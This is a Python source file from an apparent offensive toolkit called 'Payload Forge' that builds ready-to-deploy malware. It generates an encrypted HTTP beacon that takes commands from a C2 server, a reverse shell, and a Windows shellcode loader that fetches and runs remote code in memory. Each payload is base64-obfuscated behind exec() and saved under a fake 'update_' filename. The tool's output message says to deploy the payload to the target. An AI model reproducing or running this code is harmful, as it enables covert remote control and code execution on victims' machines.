"""
payloads.py — Payload Forge: Next-Gen Evasion
FIX: os.makedirs('logs', exist_ok=True) added before writing c2_aes.key
     so it never crashes on first run when logs/ doesn't exist yet.
"""

import os
import random
import string
import base64
import questionary
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class PayloadForge:
    def __init__(self):
        self.output_dir = "payloads"
        os.makedirs(self.output_dir, exist_ok=True)
        self.aes_key = Fernet.generate_key()

    def _random_name(self, ext):
        name = ''.join(random.choices(string.ascii_lowercase, k=12))
        return os.path.join(self.output_dir, f"update_{name}.{ext}")

    def forge_http_beacon(self, lhost, lport):
        """AES-Encrypted HTTP Beacon with jitter — connects to GhostHub C2."""
        raw = f"""import time,requests,subprocess,uuid,platform,random,json
from cryptography.fernet import Fernet
KEY=b'{self.aes_key.decode()}'
cipher=Fernet(KEY)
def enc(d):return cipher.encrypt(d.encode()).decode()
def dec(d):return cipher.decrypt(d.encode()).decode()
def beacon():
    aid=str(uuid.uuid4())[:8]
    si=platform.system()+' '+platform.release()
    up='http://{lhost}:{lport}/api/v2/ping'
    ur='http://{lhost}:{lport}/api/v2/result'
    while True:
        try:
            r=requests.post(up,data=enc(json.dumps({{'id':aid,'sysinfo':si}})),timeout=5)
            if r.status_code==200:
                resp=json.loads(dec(r.text))
                if resp.get('status')=='task':
                    out=subprocess.getoutput(resp['command'])
                    requests.post(ur,data=enc(json.dumps({{'id':aid,'result':out}})),timeout=5)
        except Exception:pass
        time.sleep(random.randint(10,30))
beacon()
"""
        enc = base64.b64encode(raw.encode()).decode()
        return f"import base64\nexec(base64.b64decode('{enc}'))\n"

    def forge_memory_loader(self, lhost, lport):
        """Windows in-memory shellcode loader via ctypes."""
        raw = f"""import ctypes,urllib.request,ssl
def inject():
    try:
        ctx=ssl.create_default_context()
        ctx.check_hostname=False
        ctx.verify_mode=ssl.CERT_NONE
        req=urllib.request.Request('http://{lhost}:{lport}/payload.bin',
            headers={{'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}})
        sc=urllib.request.urlopen(req,context=ctx).read()
        ptr=ctypes.windll.kernel32.VirtualAlloc(0,len(sc),0x3000,0x40)
        buf=(ctypes.c_char*len(sc)).from_buffer_copy(sc)
        ctypes.windll.kernel32.RtlMoveMemory(ptr,buf,len(sc))
        h=ctypes.windll.kernel32.CreateThread(0,0,ptr,0,0,ctypes.byref(ctypes.c_ulong(0)))
        ctypes.windll.kernel32.WaitForSingleObject(h,-1)
    except Exception:pass
inject()
"""
        enc = base64.b64encode(raw.encode()).decode()
        return f"import base64\nexec(base64.b64decode('{enc}'))\n"

    def forge_python_reverse(self, lhost, lport):
        """Pure Python reverse shell — works on any OS with Python."""
        raw = f"""import socket,subprocess,os,time
def connect():
    while True:
        try:
            s=socket.socket()
            s.connect(('{lhost}',{lport}))
            while True:
                cmd=s.recv(4096).decode().strip()
                if not cmd:break
                if cmd.lower()in['exit','quit']:s.close();return
                try:
                    out=subprocess.getoutput(cmd)
                except Exception as e:
                    out=str(e)
                s.send((out+'\\n').encode())
        except Exception:
            time.sleep(15)
connect()
"""
        enc = base64.b64encode(raw.encode()).decode()
        return f"import base64\nexec(base64.b64decode('{enc}'))\n"

    def run(self):
        draw_header("Payload Forge: Next-Gen Evasion")

        lhost = questionary.text("LHOST (your IP):", style=Q_STYLE).ask()
        if not lhost:
            return
        lport = questionary.text(
            "LPORT:", default="4444", style=Q_STYLE).ask() or "4444"

        target_type = questionary.select(
            "Payload Type:",
            choices=[
                "1. AES-Encrypted HTTP Beacon  (cross-platform, GhostHub C2)",
                "2. Python Reverse Shell        (cross-platform, raw TCP)",
                "3. Windows In-Memory Loader    (Windows, shellcode injection)",
            ],
            style=Q_STYLE
        ).ask()

        if not target_type:
            return

        if "HTTP Beacon" in target_type:
            payload = self.forge_http_beacon(lhost, lport)
            fname = self._random_name("py")
        elif "Reverse Shell" in target_type:
            payload = self.forge_python_reverse(lhost, lport)
            fname = self._random_name("py")
        elif "In-Memory" in target_type:
            payload = self.forge_memory_loader(lhost, lport)
            fname = self._random_name("py")
        else:
            return

        with open(fname, "w") as f:
            f.write(payload)

        # ── Save AES key for GhostHub ─────────────────────────────
        # FIX: ensure logs/ exists before writing key — crashes on first run otherwise
        os.makedirs("logs", exist_ok=True)
        with open("logs/c2_aes.key", "w") as f:
            f.write(self.aes_key.decode())

        console.print(Panel(
            f"[bold green][+] Payload generated![/bold green]\n\n"
            f"[white]File     :[/white] [cyan]{fname}[/cyan]\n"
            f"[white]LHOST    :[/white] {lhost}:{lport}\n"
            f"[white]AES Key  :[/white] saved to logs/c2_aes.key (GhostHub will load it)\n\n"
            "[dim]Deploy the payload to the target — it will call back to your listener.[/dim]",
            title="Forge Result", border_style="green"
        ))
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def generate_shell():
    PayloadForge().run()


if __name__ == "__main__":
    generate_shell()
